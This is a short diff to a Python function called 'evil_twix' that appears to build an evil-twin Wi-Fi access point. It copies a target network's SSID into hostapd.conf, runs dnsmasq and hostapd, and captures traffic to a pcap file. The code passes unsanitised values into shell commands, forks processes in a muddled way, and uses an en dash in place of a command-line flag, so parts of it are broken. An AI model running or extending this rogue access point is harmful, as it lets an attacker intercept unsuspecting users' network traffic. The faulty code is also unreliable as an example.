@@ -86,9 +86,15 @@ def evil_twix(interface, target):
     os.system("sed -i 's/iface_to_use/%s/' hostapd.conf" % interface)
     os.system("sed -i 's/ssid_to_use/%s/' hostapd.conf" % target[0])
 
-    os.system("dnsmasq –C dnsmasq.conf")
-    os.system("hostapd hostapd.conf")
-    os.system("tcpdump -s 0 -i %s -w test.pcap" % interface)
+    hostapd = os.fork()
+    dnsmasq = os.fork()
+
+    if dnsmasq:
+        os.system("dnsmasq –C dnsmasq.conf")
+    elif hostapd:
+        os.system("hostapd hostapd.conf")
+    else:
+        os.system("wireshark -i %s -w test.pcap" % interface)
 
 if __name__ == "__main__":
     
